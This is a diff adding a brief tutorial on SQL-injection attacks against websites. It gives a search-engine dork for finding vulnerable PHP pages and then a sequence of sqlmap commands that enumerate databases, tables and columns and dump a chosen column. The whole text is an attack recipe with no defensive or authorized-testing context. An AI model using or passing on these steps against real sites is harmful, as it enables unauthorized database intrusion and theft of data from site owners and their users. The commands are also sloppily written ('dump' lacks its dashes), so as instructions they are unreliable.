@@ -1,1 +1,9 @@
+Here i am Going to Illustrate the Commands only.
 
+Step one is have the Database domain.
+Open another tab and type; site:..domain../ php?=
+Then Select the minimal Links below the main Links for attacks.
+sqlmap -u  .....domain.....  --dbs // To find the databases information.
+sqlmap -u  .....domain.... -D  ...databasename...   --tables // To find the Tables information.
+sqlmap -u  .....domain.... -D  ...databasename... -T ....tablename.... --columns// To find the columns information.
+sqlmap -u  .....domain .... -D ...databasename... -T ...tablename.... -C ..specific_colum...  dump //Extracts information about a specific columns.
